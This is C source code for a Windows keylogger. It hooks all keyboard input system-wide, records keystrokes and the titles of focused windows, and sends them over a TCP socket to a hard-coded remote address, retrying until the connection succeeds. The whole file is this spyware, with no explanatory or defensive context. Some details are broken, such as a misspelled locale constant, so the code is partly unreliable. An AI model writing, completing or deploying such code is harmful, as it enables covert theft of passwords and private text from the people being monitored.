

#include <stdio.h>
#include <winsock2.h>
#include <windows.h>



#define HOST "192.168.47.128"    
#define PORT 8080           


#define log(msg, ...) send(connection, msg, sizeof(msg), 0)


char curr_window_title[256] = { 0 };   
char prev_window_title[256] = { 0 };  
char window_title[256 + 20] = { 0 };    
HWND curr_window_handle;               
HWND prev_window_handle;              
SOCKET connection = INVALID_SOCKET;     
HHOOK hook = { 0 };                     


SOCKET open_connection()
{
    WSADATA wsa_data = { 0 };
    struct sockaddr_in server_addr;

    
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        return 1;
    }

    
    if ((connection = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(HOST);
    server_addr.sin_port = htons(PORT);

    
    while (connect(connection, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        Sleep(1);
    }

    return connection;
}


void update_window()
{
    memset(&prev_window_title, 0, sizeof(prev_window_title));
    memcpy(prev_window_title, curr_window_title, sizeof(curr_window_title));

    prev_window_handle = curr_window_handle;

    memset(&window_title, 0, sizeof(window_title));
    sprintf(window_title, "\n\nFocused Window: %s\n\n", curr_window_title);
    log(window_title);
}


LRESULT CALLBACK ll_keyboard_proc(int n_code, WPARAM hook_message, LPARAM p_keyboard_struct)
{
   
    curr_window_handle = GetForegroundWindow();
    if (curr_window_handle) {
        GetWindowText(curr_window_handle, curr_window_title, sizeof(curr_window_title));
        if (strcmp(curr_window_title, prev_window_title) || curr_window_handle != prev_window_handle) {
            update_window();
        }
    }

    if (n_code == HC_ACTION) {

        KBDLLHOOKSTRUCT* kb_struct = (KBDLLHOOKSTRUCT*)p_keyboard_struct;

        if (hook_message == WM_KEYDOWN || hook_message == WM_SYSKEYDOWN) {

            BYTE keyboard_state[256] = { 0 };
            char ascii_buff[4] = { 0 };
            HKL keyboard_layout = GetKeyboardLayout(0);

            GetKeyboardState(keyboard_state);
            UINT vk_code = kb_struct->vkCode;
            UINT scan_code = kb_struct->scanCode;

           
            BOOL shift_pressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

           
            BOOL caps_toggled = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

            if (shift_pressed) {
                keyboard_state[VK_SHIFT] = 0x80;
            } else {
                keyboard_state[VK_SHIFT] = 0x00;
            }

            if (caps_toggled) {
                keyboard_state[VK_CAPITAL] = 0x0001;
            } else {
                keyboard_state[VK_CAPITAL] = 0x0000;
            }

           
            switch (vk_code) {

            case VK_RETURN:
                log(" [ENTER]\n");
                break;

            case VK_TAB:
                log(" [TAB] ");
                break;

            case VK_LMENU:
                log(" [LALT] ");
                break;

            case VK_RMENU:
                log(" [RALT] ");
                break;

            case VK_LWIN:
                log(" [LWIN] ");
                break;

            case VK_SHIFT:
                log(" [SHIFT] ");
                break;

            case VK_LCONTROL:
                log(" [LCTRL] ");
                break;

            case VK_RCONTROL:
                log(" [RCTRL] ");
                break;

                
            default:

                if (ToAsciiEx(vk_code, scan_code, keyboard_state, (LPWORD)ascii_buff, 0, keyboard_layout) > 0) {
                    log(ascii_buff);
                }
                break;
            }
        }
    }

    return CallNextHookEx(NULL, n_code, hook_message, p_keyboard_struct);
}


void clean_exit()
{
    UnhookWindowsHookEx(hook);

    
    closesocket(connection);
    WSACleanup();
}

int main()
{
    setlocale(NC_ALL, "ru_RU.UTF-8");

    atexit(clean_exit);

    connection = open_connection();

    hook = SetWindowsHookEx(WH_KEYBOARD_LL, ll_keyboard_proc, NULL, 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
